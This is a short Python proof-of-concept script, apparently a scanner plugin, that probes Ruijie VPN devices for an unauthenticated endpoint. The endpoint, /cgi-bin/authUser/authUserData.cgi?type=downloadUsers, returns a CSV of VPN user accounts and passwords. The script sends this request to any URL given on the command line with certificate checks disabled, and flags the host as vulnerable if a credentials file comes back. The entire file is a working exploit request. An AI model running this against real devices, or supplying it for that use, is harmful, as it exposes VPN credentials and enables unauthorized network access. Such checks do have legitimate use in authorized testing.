#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 锐捷VPN设备未授权访问漏洞
referer: unknown
author: Lucifer
description: 文件/cgi-bin/authUser/authUserData.cgi中存在未授权漏洞,可下载任意vpn账号密码。
'''
import sys
import requests
import warnings
from termcolor import cprint

class router_ruijie_unauth_BaseVerify:
    def __init__(self, url):
        self.url = url

    def run(self):
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/cgi-bin/authUser/authUserData.cgi?type=downloadUsers"
        vulnurl = self.url + payload
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            if r"filename=otp_user.csv" in req.headers['Content-Disposition']:
                cprint("[+]存在锐捷VPN设备未授权访问漏洞...(高危)\tpayload: "+vulnurl, "red")
            else:
                cprint("[-]不存在router_ruijie_unauth漏洞", "white", "on_grey")

        except:
            cprint("[-] "+__file__+"====>可能不存在漏洞", "cyan")


if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = router_ruijie_unauth_BaseVerify(sys.argv[1])
    testVuln.run()
